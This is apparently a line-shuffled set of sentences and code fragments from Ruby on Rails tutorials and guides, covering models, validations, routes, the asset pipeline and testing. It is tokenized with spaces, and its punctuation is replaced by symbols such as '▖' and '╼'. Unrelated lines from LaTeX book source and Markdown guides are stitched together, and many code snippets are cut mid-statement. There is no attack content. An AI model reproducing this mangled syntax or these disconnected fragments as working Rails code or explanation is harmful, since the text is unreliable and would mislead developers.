As is usually the case with Rails helpers , we don &apos;t need to know any details about the implementation , but what we \ emph { do } need to know is what the \ kode { f } object does : when called with a method corresponding to an \ href { http : / / www ▖ w3schools ▖ com / html / html _ forms ▖ asp } { HTML form element } ---such as a text field , radio button , or password field--- \ kode { f } returns code for that element specifically designed to set an attribute of the \ kode { @ user } object .
We ’ ve also wrapped each link inside an \ texttt { if } statement so that only admins can see them .
You &apos;ll need to edit `app / models / article ▖ rb` to add the other side of the ╼ association :
That technique has a risk , it could be the case that ` : original _ process` was taken ▖
We see here that the \ kode { empty ? } \ method , which we first saw in Section ~ \ ref { sec : objects _ and _ message _ passing } in the context of strings , also works on Rails error objects , returning \ kode { true } for an empty object and \ kode { false } otherwise .
It &apos;s inside this class that you &apos;ll define methods that will become the actions ╼ for this controller ▖
In our case , the demo app will be a microblog , with only users and short ( micro ) posts .
* The benefits of the asset pipeline .
Then , don &apos;t get your hopes up !
options = { length : 30 , omission : &quot; ▖ ▖ ▖ &quot; } ▖ merge ( options )
For completeness , we &apos;ll add the Contact page , which was left as an exercise in Chapter ~ \ ref { cha : static _ pages } .
# # # Create the Job
The last piece of functionality to add to the Microposts resource is the ability to destroy posts .
When a web page is requested , the protocol in the link to your asset ╼ that is generated will match how the webpage is accessed by default .
When doing this , ensure you are not using the `require _ tree` directive , as that ╼ will result in your assets being included more than once .
terabytes
At this point , you should open the file \ kode { app / models / micropost ▖ rb } in your text editor or IDE and fill it with the contents of Listing ~ \ ref { code : demo _ length _ validation } .
For example , `Book ▖ find ( : all , conditions : { name : &apos; 1984 &apos; } ) ` has been deprecated in favor of `Book ▖ where ( name : &apos; 1984 &apos; ) `
Rails ships with CoffeeScript by default , and so the rest of the examples ╼ in this guide will be in CoffeeScript ▖
But the tests should never pass when there is a known bug , so we should add a failing test to catch it .
Returns a label tag tailored for labelling an input field for a specified attribute .
A user then has many relationships , and has many \ kode { following } ( or \ kode { followers } ) \ emph { through } these relationships .
We &apos;ll start by reviewing what happens when a form gets submitted , and then arrange for helpful error messages to appear in the case of login failure ( as mocked up in Figure ~ \ ref { fig : login _ failure _ mockup } ▖ )
Set to `nil` to disable logging .
When hashes are the \ emph { last } argument in a function call , the curly braces are optional ; these two are equivalent :
# require &quot; sprockets / railtie &quot;
In order to mitigate SSL attacks , `form _ authenticity _ token` is now masked so that it varies with each request ▖
return false
The task is similar to updating users via the user edit view ( Listing ~ \ ref { code : user _ edit _ view } ) , but in this case with only password and confirmation fields .
self
Symbols are labels , like strings without any additional structure .
This behavior means that we must take great care when making duplicates of Ruby objects .
domain : &apos; example ▖ com &apos; ,
Time ▖ local ( 2000 , 11 , 31 ) ▖ next _ quarter # = &gt; Wed , 28 Feb 2001
```ruby
Here the embedded Ruby
validates _ associated : books
} ╼ ╼ % subsection setting _ the _ root _ route ( end ) ╼ ╼ % section slightly _ dynamic _ pages ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : static _ pages _ conclusion } ╼ ╼ Seen from the outside , this chapter hardly accomplished anything : we started with static pages , and ended with \ ldots \ \ emph { mostly } static pages ▖
and this in the corresponding view :
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
o = c ▖ orders ▖ first
The second validation , which controls the size of the image , appears in the Micropost model itself .
# # # How Turbolinks Works
Install Rails
By default , view templates are written in a language called eRuby ( Embedded ╼ Ruby ) which is processed by the request cycle in Rails before being sent to the ╼ user .
\ href { https : / / www ▖ codeschool ▖ com / } { Code School } : Good interactive online programming courses
For example , if you &apos;re rendering ` @ products` , within the partial you can refer to `product _ counter` to tell you how many times the partial has been rendered ▖
$ rails server --environment production
cattr _ accessor : last _ name , instance _ writer : false
That &apos;s a relief !
in Listing ~ \ ref { code : user _ signin _ test _ valid _ information } .
The last element needed to complete the mockup from Figure ~ \ ref { fig : profile _ mockup _ profile _ name } is the initial version of the user sidebar .
The most common XSS language is of course the most popular client-side scripting language JavaScript , often in combination with HTML ▖ _ Escaping user input is essential _ .
_ In order to understand today &apos;s attacks on web applications , it &apos;s best to take a look at some real-world attack vectors .
The sum of an empty collection is zero by default , but this is customizable :
A mockup of the reset password form .
= &gt; &#91; 42 , 8 , 17 , 7 , &quot; foo &quot; , &quot; bar &quot; &#93;
# # # `ordinal`
For example , if you want to find a collection of the dates orders were created on :
Suppose we want to set the &apos; locked &apos; attribute to `false` if we &apos;re ╼ creating a new record , but we don &apos;t want to include it in the query ▖
class Ad &lt; ActiveRecord : : Base
Defaults to `3` .
As a final touch , we &apos;ll add a URL to the user settings link to the site navigation .
They would call each other in an infinite loop .
The default format is ` : html` , and ╼ so Rails is looking for an HTML template ▖
We don &apos;t have to install RSpec itself because it is a dependency of \ texttt { rspec-rails } and will thus be installed automatically .
We can arrange for this behavior by passing an option to the \ kode { has \ _ many } association method , as shown in Listing ~ \ ref { code : micropost _ dependency } .
Finding by SQL
In predicates and flags prefer documenting boolean semantics over exact values .
initializer &quot; blorgh ▖ assets ▖ precompile &quot; do &#124; app &#124;
The console itself is built on top of interactive Ruby ( \ kode { irb } ) , and thus has access to the full power of the Ruby language .
# gem &apos; unicorn&apos;
create mode 100644 Rakefile
# = &gt; Returns unique names
invoke active _ record
The Home page with HTML structure removed ▖
Sometimes , the line between &apos; bug &apos; and &apos; feature &apos; is a hard one to draw ▖ ╼
If , despite the challenges involved , you would still prefer to complete the \ emph { Ruby on Rails Tutorial } using a local development environment , I recommend following the instructions at \ href { http : / / installrails ▖ com / } { InstallRails ▖ com }
in Listing ~ \ ref { code : title _ tests } and
# # # Changing the _ assets _ Path
To accomplish this goal , the \ emph { Ruby on Rails Tutorial } takes an integrated approach : you will learn Rails by example by building a substantial sample application from scratch .
When a user signs up , generate an activation token and corresponding activation digest .
which means we &apos;ll need a named route for the \ kode { edit } action .
In other words , \ kode { object : f ▖ object } creates a variable called \ kode { object } in the \ kode { error \ _ messages } partial , and we can use it to construct a customized error message , as shown in Listing ~ \ ref { code : updated _ error _ messages _ partial } .
Tests for the \ kode { new } session action and view .
Our method for logging a user in depends on the type of test ▖ Inside integration tests , we can post to the sessions path as in Listing ~ \ ref { code : user _ login _ test _ valid _ information } , but in other tests ( such as controller and model tests ) this won &apos;t work , and we need to manipulate the \ kode { session } method directly .
* asset pipeline :
&gt; &gt; JSON ▖ generate ( FooBar ▖ new , quirks _ mode : true ) # = &gt; &quot; \ &quot; # &lt; FooBar : 0x007fa80a481610 &gt; \ &quot; &quot;
With that , our test suite should be \ passing :
If you re-submit the form now , you &apos;ll see another familiar error : a template is ╼ missing ▖
This rendering ╼ is done within the same request as the form submission , whereas the ╼ `redirect _ to` will tell the browser to issue another request .
If your application is currently on any version of Rails older than 3 ▖ 1 ▖ x , you ╼ should upgrade to Rails 3 ▖ 1 before attempting an update to Rails 3 ▖ 2 .
The view will contain a form similar to the one we used when creating ╼ new articles ▖
# Require the gems listed in Gemfile , including any gems
Because the messages are generated by the model validations , they will automatically change if you ever change your mind about , say , the format of email addresses , or the minimum length of passwords .
Try it !
Adding validations to images .
The method `advance` advances first one month , and then one day , the result is :
Refactor
* ` : rel` specifies the `rel` value in the link ▖
conflict config / routes ▖ rb
Verify that the code in Listing ~ \ ref { code : gravatar _ option } allows the \ kode { gravatar \ _ for } helper defined in Section ~ \ ref { sec : a _ gravatar _ image } to take an optional \ kode { size } parameter , allowing code like \ kode { gravatar \ _ for user , size : 50 } in the view .
$ rackup config ▖ ru
Indeed , digging into the \ href { https : / / github ▖ com / codahale / bcrypt-ruby / blob / master / lib / bcrypt / password ▖ rb } { source code of the bcrypt gem } verifies that the comparison operator \ kode { = = } is being \ emph { redefined } , and under the hood the comparison above is equivalent to the following :
The full implementation appears in Listing ~ \ ref { code : relationships _ controller _ following } .
As a result , when we deploy the application in Section ~ \ ref { sec : unicorn _ in _ production } , SSL will automatically be enabled .
resources : comments , shallow : true
# # # Indifferent Access
`pluck` can be used to query single or multiple columns from the underlying table of a model ▖
To implement the validate method , you must have a `record` parameter defined , ╼ which is the record to be validated .
&#124; DELETE &#124; / geocoder &#124; geocoders # destroy &#124; delete the geocoder resource &#124;
Next , we need a test to capture the sequence shown in Figure ~ \ ref { fig : failed _ signin _ flash _ 3rd _ edition } and Figure ~ \ ref { fig : flash _ persistence _ 3rd _ edition } .
Article ▖ any ?
create app / views / blorgh / articles / index ▖ html ▖ erb
mattr _ accessor : autoloaded _ constants
To specify this expression just pass it in as the lock option :
A schematic representation of the model-view-controller ( MVC ) architecture .
assemblies ▖ empty ?
REST API
Breaking down the valid email regex .
╼ ╼ end
One of the examples of such conflicts is helpers ▖
First , we &apos;ll test for a \ kode { div } with CSS class ``pagination &apos; &apos; , which is what gets output by \ texttt { will \ _ paginate } .
Then take a look at the RSpec request specs ( integration tests ) :
@ target ▖ blank ?
If you use a hash-style `where` option , then record creation via this association will be automatically scoped using the hash ▖
Readonly Objects
This uses a Rails method called \ kode { add \ _ index } to add an index on the \ kode { email } column of the \ kode { users } table .
Adding lines to check for the appearance of error messages is left as an exercise ( Section ~ \ ref { sec : exercises _ a _ test _ for _ invalid _ submission } ) .
You can send a HTML string back to the browser by using the ` : html` option to ╼ `render` :
# # # # `class _ attribute`
( \ emph { Note } : Previous examples have included partial output of running \ kode { rake test } , including the number of passing and failing tests , but for brevity these will usually be omitted from here on ▖ )
Tell it to generate a ╼ `Comment` model , with the related table having two columns : a `article _ id` integer ╼ and `text` text column .
Modify the ╼ Article model , `app / models / article ▖ rb` , as follows :
# # # # field _ set _ tag
If you now click on either the ~ \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users ? page = 2 } { 2 } link or \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users ? page = 2 } { Next } link , you &apos;ll get the second page of results , as shown in Figure ~ \ ref { fig : user _ index _ page _ two _ rails _ 3 } .
A filled-in form with \ kode { text } and \ kode { password } fields .
* `attachments` - Allows you to add attachments to your email ▖
if @ book ▖ update ( book _ params )
In 2011 , Michael received a \ href { http : / / rubyheroes ▖ com / heroes } { Ruby Hero Award } for his contributions to the Ruby community .
Foreword
We come now to the heart of the Relationship associations : \ kode { following } and \ kode { followers } .
Similarly , to simulate the submission of valid data , we fill in valid information using \ kode { fill \ _ in } :
( We &apos;ll learn more about error messages in Section ~ \ ref { sec : signup _ error _ messages } ▖ )
page to show user with id \ kode { 1 }
Inside the \ kode { header } tag , we see a couple of \ kode { div } tags :
&gt; &gt; x = 1
This works well for simple changes ▖
In HTTP , the header block is followed by two CRLFs and the actual data ( usually HTML ) ▖
It does not save the associated object either .
We &apos;ll also add a way to \ emph { authenticate } a user based on a given password , a method we &apos;ll use in Chapter ~ \ ref { cha : log _ in _ log _ out } to allow users to log in to the site .
As we &apos;ll see starting in Section ~ \ ref { sec : following } , our user interface won &apos;t allow this to happen , but adding a unique index arranges to raise an error if a user tries to create duplicate relationships anyway ( for example , by using a command-line tool such as \ kode { curl } ) .
( Incidentally , the inverse of \ kode { underscore } is \ kode { camelize } , which converts \ kode { &quot; camel \ _ case &quot; } to \ kode { &quot; CamelCase &quot; } ▖ )
_ For example you want to redirect the user back to a specific page ▖
Client ▖ where ( &apos; locked &apos; = &gt; true )
# # # Custom Validators
as seen in Listing ~ \ ref { code : microposts _ create _ action } .
( Not Yet Implemented )
which ( as described in the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 1 ▖ 4 / classes / ActiveModel / Validations / HelperMethods ▖ html # method-i-validates _ confirmation _ of } { Rails API } ) automagically creates an attribute called \ kode { password \ _ confirmation } .
If you choose to use SQLite3 and are using JRuby , your `config / database ▖ yml` will look a little different ▖
( \ emph { Note : } it &apos;s not ( yet ) very gratifying ▖ )
# # # # `from ( position ) `
When you get to Chapter ~ \ ref { cha : modeling _ users } , see if you can figure out why ▖ )
This guide covers ways in which _ you _ can become a part of the ongoing development of Ruby on Rails .
# first created - &gt; highest priority .
The flash-less profile page after a browser reload .
With the code in Listing ~ \ ref { code : remember _ method } , a user logging in will be remembered in the sense that their browser will get a valid remember token , but it doesn &apos;t yet do us any good because the \ kode { current \ _ user } method defined in Listing ~ \ ref { code : current _ user } knows only about the temporary session :
If you quit your browser completely , you should also be able to verify that the application forgets your login status , requiring you to log in again to see the changes described above .
You can more succinctly express the same route this way :
For example , in Section ~ \ ref { sec : remember _ me } we &apos;ll see how to include helpers for logging in and logging out of all of the sample application &apos;s controllers .
Defaults to ` : css` .
config ▖ action _ dispatch ▖ default _ headers = {
By default Rails assumes assets have been precompiled and will be ╼ served as static assets by your web server .
Git divides a Subversion-style commit into its two logical pieces : a local recording of the changes ( \ kode { git commit } ) and a push of the changes up to a remote repository ( \ kode { git push } ) .
* `ActiveRecord : : SchemaDumper ▖ ignore _ tables` accepts an array of tables that should _ not _ be included in any generated schema file ▖
= &gt; &quot; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa &quot;
Michael Hartl
* `find _ or _ create _ by _ ▖ ▖ ▖ ` becomes `find _ or _ create _ by ( ▖ ▖ ▖ ) ` .
* Subscribe to the Rails security &#91; mailing list &#93; ( http : / / groups ▖ google ▖ com / group / rubyonrails-security )
By default , using \ kode { user ▖ microposts } to pull a user &apos;s microposts from the database makes no guarantees about the order of the posts , but ( following the convention of blogs and Twitter ) we want the microposts to come out in reverse order of when they were created , i ▖ e ▖ , most recent first .
╼ Ruby console for yourapp ▖ herokuapp ▖ com
WARNING : A &#91; long-standing bug &#93; ( https : / / github ▖ com / rails / rails / issues / 1769 ) prevents `form _ for` from working automatically with singular resources ▖
resources : users
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; inactive&apos;
In this chapter , we will complete the REST actions for the Users resource ( Table ~ \ ref { table : RESTful _ users } ) by adding \ kode { edit } , \ kode { update } , \ kode { index } , and \ kode { destroy } actions .
&lt; % = stylesheet _ link _ tag &quot; scaffold &quot; % &gt;
* * config / routes ▖ rb * *
In addition , we have the ability to securely authenticate users using a given password .
You should also verify that the tests are passing :
# # # # Testing Active Record
resources : photos , controller : &apos; images&apos;
It has a ` : remote` option you ╼ can use like this :
If you haven &apos;t been making commits as we &apos;ve been moving along , first make a commit indicating that we &apos;ve reached a stopping point :
&#124; &#124; 226 &#124; : im _ used &#124;
It will be run ╼ after the binstubs have been generated .
There are also many web development shops that specialize in Rails , such as \ href { http : / / entp ▖ com / } { ENTP } , \ href { http : / / thoughtbot ▖ com / } { thoughtbot } , \ href { http : / / pivotallabs ▖ com / } { Pivotal Labs } , \ href { http : / / hashrocket ▖ com / } { Hashrocket } , and \ href { http : / / www ▖ happyfuncorp ▖ com / } { HappyFunCorp } , plus innumerable independent consultants , trainers , and contractors .
╼ &#124; Ruby on Rails Tutorial Sample App
You can create , read , update and destroy items for a resource and these ╼ operations are referred to as _ CRUD _ operations .
* ` : touch`
# client code
You &apos;ve already seen the line of code inside the `Comment` model ╼ ( app / models / comment ▖ rb ) that makes each comment belong to an Article :
Precompiled assets exist on the file system and are served directly by your web ╼ server ▖
A mockup of the user following page .
&#91; &#93; ▖ prepend ( 10 ) # = &gt; &#91; 10 &#93;
has _ one : account _ history
xml ▖ item do
Adding a delete link to the micropost partial .
# # # `reverse _ order`
class Article &lt; ActiveRecord : : Base
This certainly appears to be an empty string , as we can verify by \ emph { chaining } the messages we pass to \ kode { nil } :
invoke erb
A \ kode { Gemfile } for the sample app .
( Note that , to keep the exercises independent , Listing ~ \ ref { code : proposed _ contact _ page } doesn &apos;t incorporate the changes made in Listing ~ \ ref { code : base _ title _ test } ▖ )
Note that Ruby functions have an \ emph { implicit return } , meaning they return the last statement evaluated---in this case , one of the two message strings , depending on whether the method &apos;s argument \ kode { string } is empty or not .
The view for the Help page with full HTML structure ▖
We &apos;ve \ emph { almost } achieved that with our current layout , with one wrinkle : as you can see if you delete the \ kode { provide } call in one of the views , in the absence of a page-specific title the full title appears as follows :
&#91; 1 , 2 , 3 &#93; ▖ in _ groups _ of ( 2 ) # = &gt; &#91; &#91; 1 , 2 &#93; , &#91; 3 , nil &#93; &#93;
# = &gt; + 1-123-555-1234
The default value is `true` .
A test of the current email implementation ▖
In other words , the code
Instead , we &apos;ll put a message in the flash to be displayed upon failed signin .
( This uses the interpolated \ kode { inspect } method mentioned in Section ~ \ ref { sec : hashes _ and _ symbols } ▖ )
Callbacks
Refactor the Home page to use separate partials for the two branches of the \ kode { if } - \ kode { else } statement .
I thus have a strong preference for including multiple assertions in a test , relying on Ruby ( via MiniTest ) to tell me the exact lines of any failed assertions .
Lastly , the `app / views` directory contains a `layouts` folder , which contains a ╼ file at `blorgh / application ▖ html ▖ erb` ▖
create app / views / blorgh / articles / edit ▖ html ▖ erb
In some cases , the controller will immediately render a \ emph { view } , which is a template that gets converted to HTML and sent back to the browser .
Rails is \ href { http : / / en ▖ wikipedia ▖ org / wiki / Sui _ generis } { \ emph { sui generis } } , and should be studied and understood separately from Ruby .
Of course , this simplicity is a sign of being \ emph { more } advanced , not less---we &apos;ve come a long way since our reliance on scaffolding in Chapter ~ \ ref { cha : a _ demo _ app } , and we no longer need most of its complexity .
Example output :
# See https : / / help ▖ github ▖ com / articles / ignoring-files for more about ignoring ╼ # files .
render action : &quot; special _ show &quot; and return
About
User fixtures were generated automatically in Listing ~ \ ref { code : generate _ user _ model } , and as shown in Listing ~ \ ref { code : default _ fixtures } the email addresses are not unique .
The initial micropost tests parallel those for the User model ( Listing ~ \ ref { code : name _ presence _ test } ) .
The Bootstrap framework makes it easy to make a nicely designed site quickly .
Here both the directory name and filename extension are important .
Here we have reused the shared \ kode { error \ _ messages } partial introduced in Section ~ \ ref { sec : signup _ error _ messages } .
create app / helpers / welcome _ helper ▖ rb
size ▖ zero ?
= &gt; # &lt; Proc : 0x007fab938d0108 @ ( irb ) : 1 ( lambda ) &gt;
&gt; &gt; Blorgh : : Article ▖ find ( 1 )
It would be far better to have a \ emph { feed } of microposts that includes the user &apos;s own posts , as mocked up in Figure ~ \ ref { fig : proto _ feed _ mockup } .
We can arrange this with the \ kode { resources } line shown in Listing ~ \ ref { code : password _ resets _ resource } .
use ActionDispatch : : Flash
It is not necessary to create a new workspace ▖ )
The `has _ one` association supports these options :
The ` : only` option tells Rails to create only the specified routes :
as shown in Listing ~ \ ref { code : micropost _ partial _ image _ display } .
This places a temporary cookie on the user &apos;s browser containing an encrypted version of the user &apos;s id , which allows us to retrieve the id on subsequent pages using \ kode { session &#91; : user \ _ id &#93; } .
Validations
_ user _ objects ( end ) ╼ ╼ % section user _ model ( end ) ╼ ╼ \ section { User validations } % ( fold ) ╼ \ label { sec : user _ validations } ╼ ╼
╼ &gt; &gt; x * = 3
becomes
I actually use a dark background for both my terminal and editor , but the light background looks better in the screenshots .
# Checks for pending migrations before tests are run .
The `id` method will not raise the `ActiveRecord : : MissingAttributeError` , so just be careful when working with associations because they need the `id` method to function properly .
&#124; ----------------------------------- &#124; -------------------------- &#124;
In fact , you can even leave off \ kode { install } .
* `config ▖ active _ record ▖ table _ name _ prefix` lets you set a global string to be prepended to table names ▖
Now the tests should pass .
Adding a URL to the ``Settings &apos; &apos; link in the site layout .
in Listing ~ \ ref { code : gemfile _ pg _ gem } .
In helpers like `link _ to` , you can specify just the object in place of the full `url _ for` call :
create app / assets / javascripts / blorgh / comments ▖ js
THE _ US-ER @ foo ▖ bar ▖ org
As a result , WEBrick \ href { https : / / devcenter ▖ heroku ▖ com / articles / ruby-default-web-server } { isn &apos;t suitable for production use } , so we &apos;ll \ href { https : / / devcenter ▖ heroku ▖ com / articles / rails-Puma } { replace WEBrick with Puma } , an HTTP server that is capable of handling a large number of incoming requests .
t ▖ references : imageable , polymorphic : true
The HTML for the form in Figure ~ \ ref { fig : signup _ form } .
All scope methods will return an `ActiveRecord : : Relation` object which will allow for further methods ( such as other scopes ) to be called on it .
Using the `--skip-sprockets` option will prevent Rails 4 from adding ╼ `sass-rails` and `uglifier` to Gemfile , so if you later want to enable ╼ the asset pipeline you will have to add those gems to your Gemfile ▖
Constraining microposts to be at most 140 characters .
# # # Textile Injection
d ▖ monday # = &gt; Mon , 10 Sep 2012
* `load _ config _ initializers` Loads all Ruby files from `config / initializers` in the application , railties and engines ▖
Client ▖ select ( : id , : name ) ▖ map { &#124; c &#124; &#91; c ▖ id , c ▖ name &#93; }
The tests in Listing ~ \ ref { code : generated _ user _ mailer _ test } use the powerful \ kode { assert \ _ match } method , which can be used either with a string or a regular expression :
Write a test to verify that the first page of the feed appears on the Home page as required .
The alternate design of remembering user login sessions on each browser independently is potentially more convenient for users , but it &apos;s less secure , and is also more complicated to implement .
Note that the columns correspond to the attributes of the data model defined in Figure ~ \ ref { fig : user _ model _ password _ digest } .
These are \ emph { exactly } the kinds of details that are easy to miss during even a simple refactoring but will be caught by a good test suite .
SELECT * FROM clients WHERE ( clients ▖ id IN ( 1,10 ) )
All elements of this array must also be in `autoload _ paths` ▖
To do so , the method loops over the pairs and builds nodes that depend on the _ values _ ▖
Partials can have their own layouts applied to them ▖
While you should usually use resourceful routing , there are still many places where the simpler routing is more appropriate ▖
The user index page ( \ href { http : / / localhost : 3000 / users } { / users } ) with a second user .
The result appears in Listing ~ \ ref { code : log _ in _ success }
╼ ╼ \ section { Updating users } % ( fold ) ╼ \ label { sec : updating _ users } ╼ ╼
If the localized template isn &apos;t present , the undecorated version will be used ▖
To write a test for a valid object , we &apos;ll create an initially valid User model object \ kode { @ user } using the special \ kode { setup } method ( discussed briefly in the Chapter ~ \ ref { cha : static _ pages } exercises ) , which automatically gets run before each test ▖ Because \ kode { @ user } is an instance variable , it &apos;s automatically available in all the tests , and we can test its validity using the \ kode { valid ? } \ method ( Section ~ \ ref { sec : creating _ user _ objects } ) .
For more on PATCH and why this change was made , see &#91; this post &#93; ( http : / / weblog ▖ rubyonrails ▖ org / 2012 / 2 / 26 / edge-rails-patch-is-the-new-primary-http-method-for-updates / ) ╼ on the Rails blog .
Ranges also work with characters :
# active _ record / associations ▖ rb
in Listing ~ \ ref { code : base _ title _ test } .
You should verify that clicking on the link in Figure ~ \ ref { fig : demo _ destroy _ user _ rails _ 3 } destroys the second user , yielding an index page with only one user .
mount Blorgh : : Engine = &gt; &quot; / blorgh &quot;
The bottom form will call the `create` action on the `UsersController` ▖
This section will provide a step-by-step guide to creating a mailer and its ╼ views .
Naturally , since Heroku is a platform for production sites , it runs each application in a production environment .
Because the only gems added in Listing ~ \ ref { code : gemfile _ pg _ gem } are restricted to a production environment , right now this command doesn &apos;t actually install any additional local gems , but it &apos;s needed to update \ kode { Gemfile ▖ lock } with the \ texttt { pg } and \ texttt { rails \ _ 12factor } gems .
Together , these three uses complete the authentication methods shown in Table ~ \ ref { table : password _ token _ digest } .
The code above will work , but note the repeated use of both \ kode { session } and \ kode { cookies } .
has _ many : orders , inverse _ of : : customer
# # # # `find _ by`
# # # # Rendering Collections
create db / migrate / 20130305221714 _ create _ users ▖ rb
The default error message is _ &quot; has already been taken &quot; _ .
t ▖ belongs _ to : patient
Active Support defines `DateTime ▖ current` to be like `Time ▖ now ▖ to _ datetime` , except that it honors the user time zone , if defined ▖
Picking a length of 6 as a reasonable minimum leads to the validation test shown in Listing ~ \ ref { code : minimum _ password _ length _ test } .
This is because some classes , like `Hash` , `OrderedHash` and `Process : : Status` need special handling in order to provide a proper JSON representation .
24 , 25 , 26 , 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 , 36 , 37 , 38 , 39 , 40 , 41 , ╼ 42 ,
name ▖ sub ( / Test $ / , &apos; &apos; ) ▖ constantize
Turbolinks
A mockup of the Home page with a form for creating microposts ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ page _ with _ micropost _ form _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Picking your queuing backend becomes more of an operational concern , ╼ then ▖
ing \ kode { Micropost ▖ find } that the user &apos;s first micropost was also destroyed ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-ec2e6b &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection ordering _ and _ dependency ( end ) ╼ ╼ % section a _ micropost _ model ( end ) ╼ ╼ \ section { Showing microposts } % ( fold ) ╼ \ label { sec : showing _ microposts } ╼ ╼
bundle install
Note the `data-remote = &quot; true &quot; ` ▖
* How to perform various calculations on Active Record models .
validates : subdomain , exclusion : { in : % w ( www us ca jp ) ,
To do so it demodulizes , underscores , and adds &quot; _ id &quot; :
This situation can &apos;t last forever , though , and we &apos;ll open this chapter with an addition to the site that brings us face-to-face with our Ruby limitations .
This code , called a \ emph { method reference } , arranges for Rails to look for a method called \ kode { create \ _ activation \ _ digest } and run it before creating the user .
It &apos;s packed ( perhaps even \ emph { too } packed ) with information ; for example , to learn more about Ruby strings you can look at the Ruby API entry for the \ kode { String } class .
{ &quot; first _ name &quot; = &gt; &quot; Rafael &quot; , &quot; created _ at &quot; = &gt; &quot; 2012-11-10 23 : 23 : 45 ▖ 281189 &quot; } ,
Instead of using a literal constructor , we can use the equivalent \ emph { named constructor } , which involves calling the \ kode { new } method on the class name
An engine * * can * * be a plugin , ╼ and a plugin * * can * * be an engine .
To get this to work , we need to define the \ kode { password \ _ reset \ _ expired ? } \ method .
The raw home view ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / raw _ home _ view _ 31-full ▖ png } { ( full size ) }
If you are using Mac OS X or ╼ Windows you have a JavaScript runtime installed in your operating system .
( Try removing the escaping and carefully inspect the page source for the micropost content that doesn &apos;t match ▖ )
Those particular messages get the attribute name prepended ( and capitalized ) ▖ `add` receives the name of the attribute you want to add the message to , and the message itself .
To verify whether or not an object is valid , Rails uses the `valid ? ` method .
Update Listing ~ \ ref { code : toy _ user _ presence _ valications } by replacing \ kode { FILL \ _ IN } with the appropriate code to validate the presence of name and email attributes in the User model ( Figure ~ \ ref { fig : user _ presence _ validations } ) .
* `ActiveSupport : : Deprecation ▖ behavior` alternative setter to `config ▖ active _ support ▖ deprecation` which configures the behavior of deprecation warnings for Rails .
( Don &apos;t worry about the Ruby syntax right now ; it will be covered in more depth in Chapter ~ \ ref { cha : rails _ flavored _ ruby } ▖ )
The code in Listing ~ \ ref { code : user _ index _ view } uses the result of Listing ~ \ ref { code : gravatar _ option } from Section ~ \ ref { sec : signup _ exercises } , which allows us to pass an option to the Gravatar helper specifying a size other than the default .
For example , consider this route :
class ArticlesController
The `belongs _ to` association creates a one-to-one match with another model ▖
Then install Spork using \ kode { bundle install } :
$ git log master ▖ .
The asset pipeline automatically evaluates ERB ▖
Finally , in Chapter ~ \ ref { cha : user _ microposts } and Chapter ~ \ ref { cha : following _ users } we &apos;ll add microblogging and social features to make a working example site .
Client ▖ create _ with ( locked : false ) ▖ find _ or _ create _ by ( first _ name : &apos; Andy &apos; )
╼ sample application .
C : : X &quot; , true ) # = &gt; true
# # # # content _ tag _ for
As an example , let &apos;s take a look at the default manifest file for app stylesheets ( Listing ~ \ ref { code : app _ css _ manifest } ) .
umerate } ╼ ╼ % subsection length _ validation ( end ) ╼ ╼ \ subsection { Format validation } % ( fold ) ╼ \ label { sec : format _ validation } ╼ ╼
This is _ not _ correct ▖
class Account &lt; ActiveRecord : : Base
Let &apos;s look again at the \ kode { sign \ _ in } function to see where we are :
SELECT * FROM comments WHERE article _ id = 10 ORDER BY name
Sass mixins allow a group of CSS rules to be bundled and reused in multiple places .
Although none of the above benefits \ emph { require } that tests be written first , there are many circumstances where test-driven development ( TDD ) is a valuable tool to have in your kit .
My favorite Rails deployment option is Heroku , which is a hosted platform built specifically for deploying Rails and other web applications
For example , you might have a view that looked like this :
This method takes exactly the same options as `render` , but it returns a string instead of sending a response back to the browser .
This behavior can be turned off by setting `ActiveRecord : : Base ▖ lock _ optimistically = false` .
Putting this into the login form gives the code shown in Listing ~ \ ref { code : remember _ me _ checkbox } .
The result should look something like Figure ~ \ ref { fig : demo _ micropost _ index } .
-------
Displaying ╼ the comments , however , is not quite right yet ▖
# # # # Avoiding Double Render Errors
Assign a hash to set additional options :
seconds _ since _ midnight
create app / controllers / welcome _ controller ▖ rb
as shown in Listing ~ \ ref { code : procfile } .
This route would match paths such as ` / photos / A12345` , but not ` / photos / 893` ▖
# = &gt; &lt; label for = &quot; name &quot; &gt; Name &lt; / label &gt;
in Listing ~ \ ref { code : signup _ form _ html } .
Client ▖ pluck ( : id )
# = &gt; Mon , 02 Aug 2010 23 : 15 : 17 + 0000
( You may also have noticed the code that appears just inside the \ kode { form } tag :
This is because the table created inside the application is ╼ different from the one created within the engine ▖
&#124; log / &#124; Application log files .
strip _ links ( &quot; &lt; a href = &quot; http : / / rubyonrails ▖ org &quot; &gt; Ruby on Rails &lt; / a &gt; &quot; )
A first test for the remember token .
( We &apos;ll learn a more elegant method for doing this in Chapter ~ \ ref { cha : sign _ up } ▖ )
Here we will use \ kode { has \ _ many : through } for the first time : a user has many following \ emph { through } relationships , as illustrated in Figure ~ \ ref { fig : user _ has _ many _ following } .
For example , if you have a jQuery library with many modules , which is stored in ╼ `lib / assets / javascripts / library _ name` , the file `lib / assets / javascripts / library _ name / index ▖ js` serves as ╼ the manifest for all files in this library ▖
= = = = = = = = = = = = = = = = = = = =
Another way to handle returning responses to an HTTP request is with `redirect _ to` ▖
p ▖ errors &#91; : name &#93;
Adding \ kode { bcrypt-ruby } to the \ kode { Gemfile } .
▖ ▖ .
# in spec / support / and its subdirectories .
Rails 4 ▖ 1 now defaults the I18n option `enforce _ available _ locales` to `true` ▖
= &gt; &#91; # &lt; User id : 1 , name : &quot; Michael Hartl &quot; , email : &quot; mhartl @ example ▖ com &quot; ,
Adding Bootstrap CSS .
